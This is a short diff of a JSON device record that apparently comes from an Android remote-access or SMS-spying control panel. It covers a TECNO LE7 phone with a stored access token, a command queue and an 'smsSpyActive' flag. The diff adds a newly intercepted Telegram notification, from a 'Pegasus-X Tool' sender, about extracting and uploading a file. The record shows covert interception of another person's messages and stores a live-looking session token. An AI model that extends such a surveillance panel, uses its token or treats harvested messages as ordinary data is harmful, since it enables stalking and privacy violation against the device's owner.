@@ -68,7 +68,7 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "2b39a6703f5db8211dfa9f9423390eb5",
-    "lastSeen": 1776621848974,
+    "lastSeen": 1776621851694,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-19T17:08:10.865Z",
@@ -84,6 +84,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Pegasus-X Tool",
+        "content": "⎙ Processing\n\n▢ Upload Information\n└──\n ├── file   : Body Lock.zip\n ├── target : a-up3\n ├── branch : main\n └── status : Extracting & Uploading...",
+        "time": "20/04 01:04",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776621852914
+      },
       {
         "appName": "WA Business",
         "sender": "WA Business",
